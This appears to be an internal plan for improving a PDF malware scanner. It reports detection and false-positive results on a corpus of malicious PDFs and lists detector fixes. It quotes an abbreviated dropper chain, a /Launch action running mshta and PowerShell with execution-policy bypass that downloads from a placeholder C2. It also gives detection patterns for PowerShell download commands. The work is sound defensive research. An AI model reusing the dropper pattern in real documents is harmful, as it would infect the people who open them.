# Technical Uplift Plan: Corpus Analysis Findings
**Date**: 2026-02-27
**Branch**: feature/consistency (baseline)
**Corpus**: 102 malware PDFs (mwb-YYYY-MM-DD collections) + benign reference set

---

## Executive Summary

Scanner was run against 20 current-corpus malware PDFs (mwb-latest) plus targeted deep analysis
of 11 representative samples spanning Gamaredon, Fog, ConnectWise, and NetSupport families.
A benign reference PDF (DORA DevOps 2023 report, 2.4MB, 152 pages) was included to measure
false-positive rate.

**Performance**: Excellent — 67–214ms per file, no crashes or hangs.

**Coverage verdict**: Partial. The scanner reliably detects embedded-script and launch-action
attack vectors with correct severity. It nearly completely misses lure-only (Gamaredon-style)
documents. Chain analysis produces meaningful attack path narratives for only ~2% of chains due
to structural deficiencies. The benign reference PDF produced 285 findings / 39 High, which is
far too noisy for operational use.

---

## Corpus Profile

| Family | Count | Attack vector |
|---|---|---|
| Gamaredon | 14 | Lure PDF with hyperlink to C2 URL, no in-PDF execution |
| Fog | 12 | JS/ObjStm embedded scripts, download chains |
| ConnectWise | 9 | Filter obfuscation + launch actions |
| NetSupport | 7 | Annotation URI chains, image anomalies |

---

## Attack Vectors Identified

### AV-1: mshta/PowerShell Dropper (ef6dff9)
**Chain**: `OpenAction → /Launch /S /Win {/F mshta /P "javascript:var abc=[...] powershell -ep Bypass -c [Net.ServicePointManager]... IRM <blogspot C2>"}`

- `/Launch` with `/Win` dict containing mshta + inline PowerShell detected (High/Strong)
- `powershell_payload_present` fires on the ObjStm stream containing PowerShell stubs
- C2 URL embedded in the PowerShell `-c` argument is **never extracted** — parser stops at
  `unsupported payload type: Dict` on the `/Win` value
- Chain score 0.95 but `chain_completeness = 0.0` — no payload node assigned

### AV-2: Font/Embedded-File Exploitation (9ff24c4)
**Chain**: `JS trigger → TTF hinting exploit → embedded file payload`

- 139 findings, 125 chains, max score 0.95
- `font.ttf_hinting_suspicious`, `font.cmap_range_overlap` fire correctly
- JS + embedded file correlation exists but remains singleton chains — not combined into one
  multi-stage chain narrative

### AV-3: Annotation URI Phishing (6eb8b5, 250179)
**Chain**: `Annotation /URI → netlify.app/#invoice`

- `annotation_action_chain/Low` fires correctly
- URL classified but not enriched — no brand/category tagging, no lookalike scoring
- Chain score 0.90 but singleton — not linked to any lure content signal

### AV-4: Gamaredon Lure-Only (9b14d367)
**Result**: 5 findings total (3 Low, 2 Info) — structural issues only

- PDF is a purely visual lure (legitimate-looking document content) with a hyperlink to a C2
- No embedded scripts, no launch actions — scanner produces near-zero signal
- This family represents 14/102 samples (14%) of the malware corpus

### AV-5: ConnectWise Filter Obfuscation (9ab20ec2)
**Result**: 89 findings, `declared_filter_invalid/High` dominates (28 hits)

- Heavy use of non-standard filter declarations as obfuscation
- 86 singleton chains, no multi-stage narrative formed
- The filter anomaly is real signal but never connected to an action chain

---

## Quantified Findings

### Chain Quality (critical gap)

From 11 deep-scanned samples (585 chains total):

| Metric | Value |
|---|---|
| Singleton chains (1 finding) | 575 / 585 (98%) |
| Chains with trigger assigned | 9 / 585 (1.5%) |
| Chains with completeness > 0.2 | 1 / 585 (0.2%) |
| Max chain score | 0.95 |
| Median chain score | 0.20 |

High scores (≥0.90) exist on chains that are singletons with 0% completeness. This means the
scoring system is driven entirely by individual finding severity, not by multi-stage correlation.
The `trigger → action → payload` narrative is present in output for only ~2% of chains.

### False Positive Rate (DORA benign report)

| Metric | Value |
|---|---|
| Total findings | 285 |
| High findings | 39 |
| Medium findings | 94 |
| Total chains | 263 |
| Multi-finding chains | 0 |
| Max chain score | 0.90 |

Top FP-generating finding kinds:
- `null_ref_chain_termination/High` — 25 hits (legitimate null-terminated object graphs)
- `content_stream_anomaly/Medium` — 25 hits (complex page content in large report)
- `label_mismatch_stream_type/High` — 14 hits (cross-referenced object types)
- `object_reference_cycle/Info` — 23 hits (normal page→annotation→parent cycles)
- `vector_graphics_anomaly/Medium` — 23 hits (legitimate SVG-derived content)
- `font.cmap_range_overlap/Medium` — 25 hits (normal Unicode coverage for technical report)
- `composite.graph_evasion_with_execute/High` — 1 hit (false positive — benign Link annotations)

---

## Priority 1 — Critical Bug Fixes

### 1.1 Fix `/Launch /Win` dict payload parsing

**Problem**: The `/Win` value in a `/Launch` action is a dictionary (`{/F mshta /P "..." /D "..."}`),
but the payload extractor handles only atomic values (Name, String). It logs
`unsupported payload type: Dict` and drops all sub-fields.

**Impact**: PowerShell commands, mshta URLs, and C2 download targets are never extracted.
This is the primary C2 exfiltration gap for the Windows launch attack vector.

**Files**: `crates/sis-pdf-detectors/src/launch_actions.rs` (payload extraction branch)

**Task**:
1. Find the branch that returns `Err("unsupported payload type: Dict")` (or equivalent).
2. When the value is a Dict, extract the standard sub-keys: `/F` (application path), `/P`
   (parameters/command line), `/D` (working directory), `/O` (operation).
3. Populate:
   - `meta["launch.win.f"]` = `/F` value (application)
   - `meta["launch.win.p"]` = `/P` value (full parameter string)
   - `meta["launch.win.d"]` = `/D` value if present
   - `meta["launch.target_path"]` = `/F` value (so existing consumers work)
4. Keep `payload.error` absent when successfully parsed (currently it's always written).
5. Add a test in `tests/launch_actions.rs` with a synthetic `/Win` dict PDF.

**Success**: `payload.error` absent on ef6dff9; `meta["launch.win.p"]` contains the full
mshta + PowerShell command line.

---

### 1.2 Extract C2 URLs from launch parameter strings

**Problem**: Even after 1.1, the `/P` field is a raw string like
`"javascript:var abc=[...]; powershell -ep Bypass -c [Net.ServicePointManager]... (IRM 'https://...')"`.
The embedded URL is not extracted as a finding or evidence item.

**Files**: `crates/sis-pdf-detectors/src/launch_actions.rs`, possibly
`crates/sis-pdf-detectors/src/uri_classification.rs`

**Task**:
1. After populating `launch.win.p`, run the parameter string through a URL extraction pass.
2. Existing approach: use the same regex/pattern the URI classification uses to find `https?://`
   and `\\\\server\\` UNC patterns in arbitrary strings.
3. For each URL found in `/P` or `/F`:
   - Emit a new `launch_win_embedded_url` finding (Medium/High depending on URL type).
   - Include the URL in `meta["launch.embedded_url"]` and in `evidence` with byte offset.
4. Apply `uri_classify()` to the extracted URL so reputation fields are set.
5. Add tests for: bare HTTPS URL, IRM-wrapped URL, mshta `javascript:` with embedded HTTP.

**Success**: ef6dff9 emits a finding with `launch.embedded_url = "https://<blogspot C2>/..."`.

---

## Priority 2 — Chain Quality

### 2.1 Expand trigger/action/payload role mapping

**Problem**: Only 9/585 chains (1.5%) have a trigger assigned. The `chain_synth.rs` role
mapping is incomplete — many finding kinds that clearly represent a trigger (e.g.
`annotation_action_chain`, `open_action_present`) are not assigned the `trigger` role.

**Files**: `crates/sis-pdf-core/src/chain_synth.rs`

**Task**:
1. Audit `trigger_from_finding()` and `payload_from_finding()` (or equivalent matching code).
2. Add role mappings for the following currently-unmapped kinds:
   - Trigger: `annotation_action_chain`, `aa_event_present`, `action_automatic_trigger`,
     `open_action_present`, `pdfjs_eval_path_risk`
   - Action: `launch_action_present`, `launch_external_program`, `launch_win_embedded_url`,
     `uri_unc_path_ntlm_risk`, `uri_classification_summary` (when domain is suspicious)
   - Payload: `powershell_payload_present`, `launch_win_embedded_url`,
     `embedded_payload_carved`, `font.ttf_hinting_suspicious`
3. After adding mappings, verify on ef6dff9 that the chain becomes:
   `Trigger:OpenAction → Action:launch_action_present → Payload:powershell_payload_present`
   with `chain_completeness ≥ 0.6`.

**Success**: At least 30% of chains on malware samples with 3+ findings have a trigger assigned.

---

### 2.2 Merge co-located findings into multi-stage chains

**Problem**: The chain synthesiser creates one chain per finding when findings are not
explicitly linked by graph edges. Many related findings (e.g., three action_payload_path
findings for the same OpenAction target) remain as separate singletons.

**Files**: `crates/sis-pdf-core/src/chain_synth.rs`, `crates/sis-pdf-core/src/correlation.rs`

**Task**:
1. In `chain_synth.rs`, after individual chain creation, run a merging pass:
   - Group chains by shared object refs (from `finding.objects`).
   - If two chains share ≥1 object ref and one is a trigger-role finding and the other is
     an action/payload-role finding, merge them into a single chain with both findings.
2. Alternatively, use `correlation.rs` to build co-occurrence clusters before chain synthesis,
   then pass clusters into chain synth as pre-grouped inputs.
3. Add a guard: do not merge chains from different `surface` categories without explicit
   cross-surface correlation evidence.

**Success**: ef6dff9 produces ≥1 chain with `len(findings) ≥ 3` and `chain_completeness ≥ 0.5`.

---

### 2.3 Fix chain completeness calculation

**Problem**: `chain_completeness = 0.0` for 97% of chains even when trigger/action/payload
are inferred. The `confirmed_stages` vs `inferred_stages` separation causes most chains to
report 0.0 completeness because inferred stages don't count toward the metric.

**Files**: `crates/sis-pdf-core/src/chain_synth.rs` (completeness calculation)

**Task**:
1. Locate the completeness formula. Current behaviour: completeness = `confirmed_stages.len() / 3`.
2. Change to: `completeness = (confirmed_stages.len() * 0.8 + inferred_stages.len() * 0.4) / 3`,
   capped at 1.0.
3. This allows inferred trigger/action/payload to partially satisfy completeness — a chain with
   one confirmed and two inferred stages becomes ~0.8 * 0.27 + 0.4 * 0.27 * 2 ≈ 0.48.
4. Ensure `low_completeness: "true"` annotation threshold (currently 0.2) is updated if
   the formula change shifts the distribution.

**Success**: ef6dff9 top chain has `chain_completeness ≥ 0.4`. DORA benign chains stay ≤ 0.2.

---

## Priority 3 — False Positive Reduction

### 3.1 `null_ref_chain_termination` — reduce High severity on benign patterns

**Problem**: 25 High hits on DORA benign PDF. `null_ref_chain_termination` fires whenever an
object graph path terminates in a null reference. In large PDFs with many cross-references,
this is normal — null is a valid PDF placeholder in sparse arrays and form field defaults.

**Files**: `crates/sis-pdf-detectors/src/` (finding that emits `null_ref_chain_termination`)

**Task**:
1. Add a context check: if the null reference is in an array slot (e.g., Kids[], Annots[])
   rather than a direct action chain, downgrade severity from High to Low/Info.
2. Add a suppression condition: if the parent object is not an action dict (no `/S` key),
   downgrade to Info.
3. Add minimum-depth requirement: only fire Medium+ if the null ref is ≥ 2 hops from a
   trigger object (OpenAction, AA event, etc.).
4. Add a test fixture (benign PDF with null array slots) to the regression suite.

**Success**: DORA `null_ref_chain_termination` count drops from 25 High → ≤5 Low.

---

### 3.2 `label_mismatch_stream_type` — calibrate severity for cross-reference patterns

**Problem**: 14 High hits on DORA benign PDF. Large PDFs with object streams (/ObjStm) that
contain both stream and non-stream objects often produce label mismatches due to the compressed
object encoding. This is not a reliable malicious indicator on its own.

**Files**: `crates/sis-pdf-detectors/src/` (finding that emits `label_mismatch_stream_type`)

**Task**:
1. Check if the object is inside an ObjStm: if `meta["blob.origin"] == "objstm"` (or
   equivalent), downgrade from High to Low (ObjStm objects legitimately don't have stream
   headers).
2. Add corroboration requirement for High: only keep High if a co-located action-type finding
   exists for the same object.
3. Add test: ObjStm-embedded dict that triggers label_mismatch should emit Low, not High.

**Success**: DORA `label_mismatch_stream_type` count drops from 14 High → 0 High (some Low OK).

---

### 3.3 `composite.graph_evasion_with_execute` — require higher evasion confidence

**Problem**: 1 High hit on DORA benign PDF. The composite fires because the benign PDF has
annotation Link objects (`/Subtype Link`) with a `/Parent` back-reference, which the cycle
detector interprets as a graph evasion cycle near an execute surface.

**Files**: `crates/sis-pdf-detectors/src/composite.rs` (or equivalent composite detector)

**Task**:
1. Require `graph.evasion_count ≥ 2` (currently fires at ≥ 1).
2. Add suppression: if all detected cycles are `cycle_near_execute` type where the "execute
   surface" is only a URI action (`/URI`), not a script/launch action, downgrade to Medium.
3. Add suppression: if `evasion_kind` is only `reference_cycle` (not `shadow_cycle` or
   `detached_chain`), require ≥ 3 cycles to keep High.

**Success**: DORA composite finding drops to Info or disappears. ef6dff9 retains High.

---

### 3.4 `font.ttf_hinting_suspicious` noise reduction

**Problem**: 36 hits across 11 malware samples + fires on benign PDFs. TTF hinting is normal
in commercial fonts. The detector fires too broadly.

**Files**: `crates/sis-pdf-detectors/src/font_exploits.rs` (or `font_hinting.rs`)

**Task**:
1. Add a corroboration requirement: `font.ttf_hinting_suspicious` should only remain Medium+
   if ≥1 of the following is also present in the same document:
   - `font.dynamic_parse_failure`
   - `embedded_payload_carved`
   - A JS or launch action finding
2. Without corroboration, downgrade to Low.
3. Add `font.ttf_hinting_push_count` to meta (already appears to have loop detection) and
   require `push_count ≥ threshold` (suggest 3) to fire at all.

**Success**: Benign PDF `font.ttf_hinting_suspicious` count → 0. Malware retention ≥ 80%.

---

### 3.5 `object_reference_cycle` on annotation `Parent` references

**Problem**: 23 Info hits on DORA. The cycle detector correctly suppresses `page_tree_parent_child`
cycles (Type=Pages), but annotation objects with a `/P` (page) back-reference also trigger cycles
that are standard PDF structure.

**Files**: `crates/sis-pdf-detectors/src/graph_cycles.rs` (or object_reference_cycle emitter)

**Task**:
1. Add suppression for cycles where one node is an annotation (`/Subtype` ∈ {Link, Widget,
   FreeText, ...}) and the other is a Page (`/Type = Page`) — this is the standard `/P`
   back-reference pattern.
2. Classify these as `cycle_type: "annotation_page_parent"` and emit Info only (not Medium).
3. In the composite, do not count `annotation_page_parent` cycles toward evasion score.

**Success**: DORA `object_reference_cycle/Medium` drops from 2 → 0; Info count acceptable.

---

## Priority 4 — Coverage Gaps

### 4.1 Lure/phishing PDF detection (Gamaredon pattern)

**Problem**: 14/102 malware samples (Gamaredon family) produce only 3–5 Low/Info structural
findings. These are lure-only PDFs: plausible document appearance + a single hyperlink to a
C2 URL. The scanner has no detector for this pattern.

**Files**: New detector in `crates/sis-pdf-detectors/src/lure_detection.rs`
**Data needed**: Annotation URI extraction (already exists), page content analysis

**Task**:
1. Implement `detect_lure_pdf()`:
   - Count annotation URIs that are external HTTP/S links.
   - Count page content objects (text streams, image streams).
   - If external_uri_count ≥ 1 and total_objects ≤ 20 and js_count == 0:
     emit `lure_minimal_content/Medium/Probable`.
   - If external_uri_count ≥ 1 and single page and no `/OpenAction`:
     emit `lure_single_page_with_uri/Low/Possible`.
2. In deep mode, also check if the URI domain matches known C2 patterns (via existing
   `uri_classification.rs` threat categories).
3. Emit `intent.bucket: "phishing_lure"` when lure conditions match.

**Success**: Gamaredon sample (9b14d367) receives `lure_minimal_content/Medium` instead of
only structural Low/Info findings.

---

### 4.2 URI content enrichment and C2 scoring

**Problem**: URIs in annotation actions are classified but not enriched. No categorization by
domain type (CDN, URL-shortener, paste site, known C2 hosting provider), no similarity scoring
against known phishing patterns, no integration with chain scoring.

**Files**: `crates/sis-pdf-detectors/src/uri_classification.rs`

**Task**:
1. Add a domain category lookup (static table or pattern matching) for high-risk hosting:
   - Free hosting: `netlify.app`, `pages.dev`, `vercel.app`, `*.000webhostapp.com`
   - Paste/share sites: `pastebin.com`, `paste.ee`, `hastebin.com`
   - URL shorteners: `bit.ly`, `tinyurl.com`, `rb.gy`, `is.gd`
   - Abuse-prone cloud: `blogspot.com`, `blogger.com`, `github.io` (free tier)
2. Add `meta["uri.domain_category"]` and `meta["uri.risk_tier"]` (high/medium/low) to
   `uri_classification_summary`.
3. When `risk_tier = high`, upgrade `annotation_action_chain` from Low to Medium.
4. In chain synth, use `uri.risk_tier = high` as a chain score booster (+0.1) alongside
   existing intent bucket feedback.

**Success**: Netlify/blogspot URIs classified as `risk_tier=high`; annotation chain severity
upgraded; chain score boosted.

---

### 4.3 Structured annotation-only attack chain detector

**Problem**: Annotation URI chains (AV-3) are detected as individual Low findings but never
assembled into a named attack chain narrative. No finding type describes the complete picture:
"lure content + suspicious URI + known hosting = phishing delivery chain".

**Files**: `crates/sis-pdf-detectors/src/composite.rs` (or new `phishing_chain.rs`)

**Task**:
1. Implement a composite finding `phishing_uri_delivery_chain`:
   - Fires when: `annotation_action_chain` + `uri.risk_tier=high` co-occur in same document.
   - Severity: Medium (no JS = lower risk than scripted attack).
   - Sets trigger = annotation, action = URI open, payload = external content.
2. Emit `chain_completeness ≥ 0.6` for these chains (confirmed: trigger + action present;
   payload inferred from external URL).
3. Also handles: annotation_action_chain + `unc_path` (NTLM credential theft via SMB).

---

### 4.4 JavaScript C2 URL extraction in script analysis

**Problem**: When JS contains `powershell -c "...IRM 'https://...'..."` or similar patterns,
the URL is inside a script string that is not extracted. The JS sandbox executes static-path
scripts but does not extract URLs from within PowerShell/shell command arguments.

**Files**: `crates/js-analysis/src/` (script analysis crate)

**Task**:
1. Add a post-execution (or pre-execution static) pass that scans script source text for:
   - URL patterns in string literals: `https?://[a-zA-Z0-9.-]+/[^\s"']+`
   - PowerShell download patterns: `IRM|Invoke-RestMethod|Invoke-WebRequest|curl|wget`
   - Base64 decode + URL patterns: `[Convert]::FromBase64String` / `[System.Text.Encoding]`
2. For each URL found, emit `js_extracted_url` finding with the URL in `meta["url.value"]`
   and the surrounding context in evidence.
3. In the chain, link `js_extracted_url` to the parent JS finding as a payload node.

---

## Priority 5 — Deep Mode Improvements

### 5.1 Deep mode — behavioral correlation pass

**Problem**: With `--deep`, standard scan and deep scan produce identical output for all
20 malware samples (none had XFA). Deep mode currently adds only XFA→JS forwarding.
Deep mode should provide meaningfully richer analysis.

**Files**: `crates/sis-pdf-core/src/scan.rs` (deep mode flag handling)

**Task**:
Add the following analysis passes gated on `deep_scan = true`:
1. **Multi-revision shadow analysis**: Run full diff of object values across revisions
   (not just structural fingerprinting). Emit a finding for each object that changes
   semantically (action type, URI value, script content) across revisions.
2. **Cross-object script extraction**: For launch `/P` params (after 1.2), embedded
   file attachments, and annotation title/tooltip strings — pass all text content
   through the JS/PowerShell pattern scanner.
3. **Entropy clustering**: Group objects by entropy tier (high ≥ 7.0, medium 4-7, low <4)
   and flag documents where >30% of objects are high-entropy (possible encrypted payload).
4. **Complete font table scan**: In standard mode, font anomaly detection may skip unusual
   font subtypes. In deep mode, parse all font program objects for shellcode patterns.

---

### 5.2 Deep mode — obfuscated filter chain deobfuscation

**Problem**: ConnectWise samples use `declared_filter_invalid` to hide content. The filter
sequence is deliberately malformed to confuse parsers. Deep mode should attempt to
deobfuscate by trying alternative filter decodings.

**Files**: `crates/sis-pdf-pdf/src/` (filter chain parser)

**Task**:
1. In deep mode, when a filter chain fails, retry with:
   - Skip the invalid filter and try remaining filters.
   - Try known filter aliases (some PDFs use `/Fl` instead of `/FlateDecode`).
2. If retry succeeds, mark the stream as `filter.recovery_applied = true` and scan
   the deobfuscated content.
3. Emit `filter_obfuscation_bypass` (Info) when recovery is applied.

---

## Priority 6 — Infrastructure & Telemetry

### 6.1 Payload parsing error telemetry

**Problem**: `payload.error: unsupported payload type: Dict` is surfaced in finding meta
but not tracked centrally. We cannot easily query how many files are affected or which
payload types are unhandled.

**Task**:
1. Add `payload_parse_error_count` to `structural_summary` in the report.
2. Add `payload_parse_errors: Vec<{kind: String, object: String}>` to `structural_summary`.
3. In batch mode, aggregate these into the batch summary statistics.

---

### 6.2 Corpus regression CI gate

**Problem**: No automated check runs the scanner against the malware corpus. Regressions in
detection coverage (e.g., a code change that breaks `launch_action_present`) would not be
caught by unit tests.

**Task**:
1. Create `crates/sis-pdf/tests/corpus_regression.rs` with tests that:
   - Scan `tmp/corpus/mwb-latest/*.pdf` (or a fixed 20-file subset committed as test fixtures).
   - Assert that each known-malware file produces `summary.high ≥ 1` (or specific finding kinds
     for well-characterised samples like ef6dff9 must produce `launch_action_present`).
   - Assert that the benign reference file produces `summary.high ≤ 5` (FP budget).
2. Gate this test on a feature flag or env var so it only runs in CI with the corpus available.

---

### 6.3 Benign baseline scoring (FP budget tracking)

**Problem**: No mechanism to track FP rate over time. A change to a composite detector could
silently double the High finding count on benign PDFs.

**Task**:
1. Add a `--score-benign` flag (or repurpose an existing CLI flag) that runs the scanner
   against a set of known-benign PDFs and outputs a summary of finding counts by severity.
2. Commit a `tests/benign-baseline.json` fixture with expected max counts per kind.
3. Fail CI if any kind exceeds its baseline by >20%.

---

## Implementation Order

| Priority | Item | Effort | Impact |
|---|---|---|---|
| P1 | 1.1 Fix /Win dict parsing | Small | Critical — C2 URL extraction |
| P1 | 1.2 Extract URLs from /P params | Small | Critical — C2 extraction |
| P2 | 2.1 Expand role mapping | Medium | High — chain completeness |
| P3 | 3.1 null_ref FP reduction | Small | High — benign noise |
| P3 | 3.2 label_mismatch FP reduction | Small | High — benign noise |
| P3 | 3.3 composite FP reduction | Small | Medium — specific FP |
| P4 | 4.1 Lure PDF detection | Medium | High — Gamaredon coverage |
| P4 | 4.2 URI enrichment | Small | Medium — chain scoring |
| P2 | 2.2 Chain merging | Large | High — chain quality |
| P2 | 2.3 Completeness formula | Small | Medium — chain quality |
| P4 | 4.3 Phishing chain composite | Medium | Medium — chain narrative |
| P3 | 3.4 font hinting noise | Small | Medium — noise reduction |
| P3 | 3.5 annotation cycle FP | Small | Low — edge case |
| P4 | 4.4 JS URL extraction | Medium | Medium — coverage |
| P5 | 5.1 Deep mode behavioral pass | Large | Medium — deep mode ROI |
| P5 | 5.2 Filter deobfuscation | Medium | Medium — ConnectWise |
| P6 | 6.1 Payload error telemetry | Small | Low — observability |
| P6 | 6.2 Corpus regression CI | Medium | High — regression guard |
| P6 | 6.3 Benign baseline CI | Small | High — FP tracking |

---

## Success Metrics

After completing P1–P3:
- ef6dff9 (mshta dropper): `launch.embedded_url` finding present; chain with trigger+action+payload
- 9b14d367 (Gamaredon): ≥ 1 Medium finding (lure detection)
- DORA benign: High findings ≤ 5 (down from 39)
- Chain singletons: ≤ 85% (down from 98%)
- Chains with trigger: ≥ 10% (up from 1.5%)

After completing P1–P5:
- 9ab20ec2 (ConnectWise): filter obfuscation narrative in top chain
- All malware samples: at least 1 chain with `chain_completeness ≥ 0.3`
- Deep vs standard mode: measurably different finding counts on ≥ 5/11 samples
